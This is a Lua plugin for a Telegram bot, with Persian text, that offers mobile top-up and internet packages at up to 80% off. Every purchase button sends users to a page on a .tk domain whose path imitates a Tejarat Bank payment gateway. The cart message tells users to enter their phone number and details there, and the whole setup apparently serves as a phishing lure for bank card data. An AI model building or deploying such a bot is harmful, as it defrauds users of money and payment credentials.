local function do_keyboard_zdc()
    local keyboard = {}
    keyboard.inline_keyboard = {
{
{text = '1000 تومانی - فقط با 500 تومان', callback_data = '!a'},
},
	{
{text = '2000 تومانی - فقط با 1000 تومان', callback_data = '!b'},
},
	{
{text = '5000 تومانی - فقط با 2500 تومان', callback_data = '!c'},
},
	{
{text = '10000 تومانی - فقط با 4000 تومان', callback_data = '!d'},
},
	{
{text = '20000 تومانی - فقط با 7000 تومان', callback_data = '!e'},
},
	    {
	    {text = '🔙بازگشت', callback_data = '!next'}
        }
    }
    return keyboard
end
local function do_keyboard_next()
    local keyboard = {}
    keyboard.inline_keyboard = {
{
    		    		{text = 'مستقیم➡️', callback_data = '!zdc'},
	    },
{
    		    		{text = 'بسته اینترنت🆕', callback_data = '!internet'},
	    },
{
    		    		{text = 'رمز شارژℹ️', callback_data = '!code'},
	    },
    }
    return keyboard
end
local function do_keyboard_private()
    local keyboard = {}
    keyboard.inline_keyboard = {
    {
	        {text = 'شروع✅', callback_data = '!next'},
        },
	}		
    return keyboard
end

local function do_keyboard_startme()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = '📥click', url = 'https://telegram.me/'..bot.username}
	    }
    }
    return keyboard
end
local function do_keyboard_internet()
    local keyboard = {}
    keyboard.inline_keyboard = {
	    {
	    {text = '2000 - 1 گیگابایت', callback_data = '!f'}
        },
	{
	{text = '5000 - 3 گیگابایت', callback_data = '!g'}
        },
	{
	{text = '7000 - 5 گیگابایت', callback_data = '!h'}
        },
	{
	{text = '10000 - 10 گیگابایت', callback_data = '!i'}
        },
	{
	{text = '15000 - 20 گیگابایت', callback_data = '!j'}
        },
		{
	{text = '🔙بازگشت', callback_data = '!next'}
        }
    }
    return keyboard
end
local function do_keyboard_code()
    local keyboard = {}
    keyboard.inline_keyboard = {
{
{text = '1000 تومانی - فقط با 500 تومان', callback_data = '!k'},
},
	{
{text = '2000 تومانی - فقط با 1000 تومان', callback_data = '!l'},
},
	{
{text = '5000 تومانی - فقط با 2500 تومان', callback_data = '!m'},
},
	{
{text = '10000 تومانی - فقط با 4000 تومان', callback_data = '!n'},
},
	{
{text = '20000 تومانی - فقط با 7000 تومان', callback_data = '!o'},
},
	    {
	    {text = '🔙بازگشت', callback_data = '!next'}
        }
    }	 
    return keyboard
end
local function do_keyboard_a()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!zdc'},

    },    
    }
    return keyboard
end
local function do_keyboard_b()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!zdc'},

    },    
    }
    return keyboard
end
local function do_keyboard_c()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!zdc'},

    },    
    }
    return keyboard
end
local function do_keyboard_d()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!zdc'},

    },    
    }
    return keyboard
end
local function do_keyboard_e()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!zdc'},

    },    
    }
    return keyboard
end
local function do_keyboard_f()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!internet'},

    },    
    }
    return keyboard
end
local function do_keyboard_g()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!internet'},

    },    
    }
    return keyboard
end
local function do_keyboard_h()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!internet'},

    },    
    }
    return keyboard
end
local function do_keyboard_i()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!internet'},

    },    
    }
    return keyboard
end
local function do_keyboard_j()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!internet'},

    },    
    }
    return keyboard
end
local function do_keyboard_k()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!code'},

    },    
    }
    return keyboard
end
local function do_keyboard_l()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!code'},

    },    
    }
    return keyboard
end
local function do_keyboard_m()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!code'},

    },    
    }
    return keyboard
end
local function do_keyboard_n()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!code'},

    },    
    }
    return keyboard
end
local function do_keyboard_o()
    local keyboard = {}
    keyboard.inline_keyboard = {
    	{
    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
	    },
	{
	        		{text = '🔙بازگشت', callback_data = '!code'},

    },    
    }
    return keyboard
end
local action = function(msg, blocks, ln)
        if blocks[1] == 'start' or blocks[1] == 'help' then
	db:sadd('ids:', msg.from.id)
        if msg.chat.type == 'private' then
            local message = [[سلام به ربات فست شارژ خوش امدید!#⃣
در این ربات شما میتونید تا سقف 80% تخفیف شارژ بخرید!‼
مثلا 20 گیگ اینترنت رو فقط با 15 هزار تومان خریداری کنید.
برای شروع و خرید روی دکمه ی "شروع" کلیک کنید و سپس نوع شارژ را انتخاب کنید!👇👇]]
            local keyboard = do_keyboard_private()
            api.sendKeyboard(msg.from.id, message, keyboard, true)
            end
        return
    end

if blocks[1] == 'broadcast' and blocks[2] and is_admin(msg) then
    local gps = db:scard('ids') or 0
          local gpss = db:smembers('ids') or 0
	for i=1, #gpss do
		  api.sendMessage(gpss[i], blocks[2], true)
    end
                   api.sendMessage(msg.from.id, '*Your Msg Send to* `|'..gps..'|` *Users!*', true)
	end
if blocks[1] == 'status' then
local users = db:scard('ids')
 api.sendMessage(msg.chat.id, 'Users : |'..users..'|', true)
end
if blocks[1] == 'reset' then
 db:del('ids')
 api.sendMessage(msg.chat.id, '*Bot Users Reseted!*', true)
end
    if msg.cb then
        local query = blocks[1]
        local msg_id = msg.message_id
        local text
	if query == 'next' then
local text = [[سلام، خواهشا نوع شارژ خود را انتخاب نمایید.👇🏻]]
            local keyboard = do_keyboard_next()
	api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
        if query == 'internet' then
            local text = 'لطفا بسته ی اینترنت دلخواه خود را انتخاب نمایید.👇🏻'
            local keyboard = do_keyboard_internet()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'code' then
            local text = [[لطفا مبلغ شارژ را انتخاب کنید👇🏻
((تخفیف ویژه))]]
            local keyboard = do_keyboard_code()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'zdc' then
local text = [[لطفا مبلغ شارژ را انتخاب کنید👇🏻
((تخفیف ویژه))]]
local keyboard = do_keyboard_zdc()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'a' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : مستقیم
▪مبلغ شارژ: 1000 تومان
▪مبلغ با احتساب تخفیف: 500 تومان
▪مبلغ قابل پرداخت: 500 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_a()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'b' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : مستقیم
▪مبلغ شارژ: 2000 تومان
▪مبلغ با احتساب تخفیف: 1000 تومان
▪مبلغ قابل پرداخت: 1000 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_b()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'c' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : مستقیم
▪مبلغ شارژ: 5000 تومان
▪مبلغ با احتساب تخفیف: 2500 تومان
▪مبلغ قابل پرداخت: 2500 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_c()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'd' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : مستقیم
▪مبلغ شارژ: 10000 تومان
▪مبلغ با احتساب تخفیف: 4000 تومان
▪مبلغ قابل پرداخت: 4000 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_d()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'e' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : مستقیم
▪مبلغ شارژ: 20000 تومان
▪مبلغ با احتساب تخفیف: 7000 تومان
▪مبلغ قابل پرداخت: 7000 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_e()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'f' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : اینترنت 1 گیگابایت 
▪مبلغ شارژ: 4000 تومان
▪مبلغ با احتساب تخفیف: 2000 تومان
▪مبلغ قابل پرداخت: 2000 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_f()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'g' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : اینترنت 3 گیگابایت 
▪مبلغ شارژ: 13000 تومان
▪مبلغ با احتساب تخفیف: 5000 تومان
▪مبلغ قابل پرداخت: 5000 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_g()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'h' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : اینترنت 5 گیگابایت 
▪مبلغ شارژ: 18000 تومان
▪مبلغ با احتساب تخفیف: 7000 تومان
▪مبلغ قابل پرداخت: 7000 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_h()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'i' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : اینترنت 10 گیگابایت 
▪مبلغ شارژ: 30000 تومان
▪مبلغ با احتساب تخفیف: 10000 تومان
▪مبلغ قابل پرداخت: 10000 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_i()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'j' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : اینترنت 20 گیگابایت 
▪مبلغ شارژ: 50000 تومان
▪مبلغ با احتساب تخفیف: 15000 تومان
▪مبلغ قابل پرداخت: 15000 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_j()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'k' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : مستقیم
▪مبلغ شارژ: 1000 تومان
▪مبلغ با احتساب تخفیف: 500 تومان
▪مبلغ قابل پرداخت: 500 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_k()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'l' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : مستقیم
▪مبلغ شارژ: 2000 تومان
▪مبلغ با احتساب تخفیف: 1000 تومان
▪مبلغ قابل پرداخت: 1000 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_l()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'm' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : مستقیم
▪مبلغ شارژ: 5000 تومان
▪مبلغ با احتساب تخفیف: 2500 تومان
▪مبلغ قابل پرداخت: 2500 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_m()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'n' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : مستقیم
▪مبلغ شارژ: 10000 تومان
▪مبلغ با احتساب تخفیف: 4000 تومان
▪مبلغ قابل پرداخت: 4000 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_n()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
if query == 'o' then
            local text = [[سبد خرید:📗
▪️نوع شارژ : مستقیم
▪مبلغ شارژ: 20000 تومان
▪مبلغ با احتساب تخفیف: 7000 تومان
▪مبلغ قابل پرداخت: 7000 تومان
برای ادامه ی عملیات پرداخت به سایت رفته و شماره تلفن و مشخصات را وارد نمایید سپس شما به درگاه پرداخت امن بانک تجارت منتقل میشوید تا با خیال راحت پرداخت خود را با احتساب تخفیف انجام دهید و از شارژ خود لذت ببرید!
برای رفتن به سایت بر روی دکمه ی زیر کلیک کنید👇🏻]]
            local keyboard = do_keyboard_o()
        api.editMessageText(msg.chat.id, msg_id, text, keyboard, true)
end
        if query == 'share' then
     api.sendContact(msg.from.id, '+989309649221', '🔸~[S]epehr')
end
			end
    end

return {
	action = action,
	triggers = {
	    '^/(start)$',
	    '^/(reset)$',
	   '^/(status)$',
	    '^###cb:!(next)',
		'^###cb:!(internet)',
		'^###cb:!(code)',
		'^###cb:!(zdc)',
	   	 '^###cb:!(a)',
		 '^###cb:!(b)',
		 '^###cb:!(c)',
		 '^###cb:!(d)',
		 '^###cb:!(e)',
		 '^###cb:!(f)',
		 '^###cb:!(g)',
		 '^###cb:!(h)',
		 '^###cb:!(i)',
		 '^###cb:!(j)',
		 '^###cb:!(k)',
		 '^###cb:!(l)',
		 '^###cb:!(m)',
		 '^###cb:!(n)',
	   	 '^###cb:!(o)',
    }
}
